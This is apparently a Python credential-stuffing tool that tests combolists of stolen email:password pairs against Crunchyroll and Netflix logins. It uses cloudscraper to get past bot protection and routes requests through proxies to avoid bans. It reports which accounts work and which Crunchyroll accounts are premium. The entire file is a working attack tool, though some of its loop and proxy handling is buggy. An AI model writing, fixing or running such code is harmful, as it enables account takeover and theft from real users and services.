import cloudscraper, requests
from bs4 import BeautifulSoup as soup

class Checker():
    def __init__(self, combolist: list, proxy: list):
        self.combolist = combolist
        self.proxy = proxy
        self.session = cloudscraper.create_scraper()

    def crchecker(self):
        login = self.session.get("https://www.crunchyroll.com/login")
        free = []
        premium = []
        try:
            for combo in self.combolist:
                try:
                    for proxy in self.proxy:
                        proxy.strip()
                        combo.strip()
                        combo = combo.split(":")
                        login_soup = soup(login.content, "html5lib")
                        csrftok = login_soup.find("input", id="login_form__token")["value"]
                        self.session.post('https://www.crunchyroll.com/login', data={
                            'login_form[name]' : combo[0],
                            'login_form[password]' : combo[1],
                            'login_form[redirect_url]': '/de',
                            'login_form[_token]': csrftok
                        }, proxies={"http": str(self.proxy), "https": str(self.proxy)})
                        membership = self.session.get('https://www.crunchyroll.com/de/acct/membership')
                        member_soup = soup(membership.text, "html5lib")
                        if member_soup.title.get_text() == 'Crunchyroll -   Account Management\n':
                            if member_soup.find('td').get_text() == 'Premium':
                                print(f"{combo[0]}:{combo[1]} | Premium Membership")
                                premium.append(f"{combo[0]}:{combo[1]}")
                            else:
                                print(f"{combo[0]}:{combo[1]} | Free Membership")
                                free.append(f"{combo[0]}:{combo[1]}")
                        else:
                            print(f"[ERROR] Combo False: {combo[0]}:{combo[1]}")
                except Exception as e:
                    print(f"[Proxy Dead or Banned]: {proxy}")
        except Exception as e:
            print(f"{e}")
        return free, premium

    def nxchecker(self):
        self.session.get("https://www.netflix.com/de-en/login")
        working = []
        try:
            for combo in self.combolist:
                try:
                    for proxy in self.proxy:
                        proxy.strip()
                        combo.strip()
                        combo = combo.split(":")
                        p = self.session.post('https://www.netflix.com/de-en/login', data={
                            'userLoginId' : combo[0],
                            'password' : combo[1],
                            'rememberMe': 'false'
                            }, proxies={"http": str(self.proxy), "https": str(self.proxy)})
                        if p.url == "https://www.netflix.com/browse":
                            print(f"{combo[0]}:{combo[1]} | Working")
                            working.append(f"{combo[0]}:{combo[1]}")
                        else:
                            print(f"{combo[0]}:{combo[1]} | Not Working")
                except Exception as e:
                    print(f"[Proxy Dead or Banned]: {proxy}")
        except Exception as e:
            print(f"{e}")
        return working

    def close_session(self):
        self.session.close()